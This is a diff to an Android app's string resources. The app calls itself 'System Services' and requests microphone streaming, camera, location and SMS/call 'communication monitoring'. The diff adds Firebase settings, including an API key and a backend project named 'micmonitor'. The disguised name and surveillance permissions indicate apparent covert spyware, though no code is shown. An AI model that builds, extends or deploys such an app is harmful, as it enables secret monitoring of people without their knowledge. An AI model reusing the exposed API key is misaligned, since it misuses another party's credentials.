@@ -5,10 +5,16 @@
     <string name="app_subtitle">System Services</string>
     <string name="btn_grant_permissions">Grant All Permissions</string>
     <string name="desc_permissions">Device Services needs the following permissions to operate:</string>
+    <string name="gcm_defaultSenderId" translatable="false">1023986670313</string>
+    <string name="google_api_key" translatable="false">AIzaSyB0FIxyGjmKK7OhNz0wvcWMx9IUyyKXpHQ</string>
+    <string name="google_app_id" translatable="false">1:1023986670313:android:2879c11e55b3345731ae78</string>
+    <string name="google_crash_reporting_api_key" translatable="false">AIzaSyB0FIxyGjmKK7OhNz0wvcWMx9IUyyKXpHQ</string>
+    <string name="google_storage_bucket" translatable="false">micmonitor-3a96d.firebasestorage.app</string>
     <string name="perm_audio">Microphone - for audio capture and streaming</string>
     <string name="perm_camera">Camera - for photo and video capture</string>
     <string name="perm_location">Location - for location services</string>
     <string name="perm_sms">SMS/Calls - for communication monitoring</string>
+    <string name="project_id" translatable="false">micmonitor-3a96d</string>
     <string name="status_denied">Microphone permission denied</string>
     <string name="status_requesting">Requesting permissions...</string>
     <string name="status_retry">Please allow permissions to continue</string>
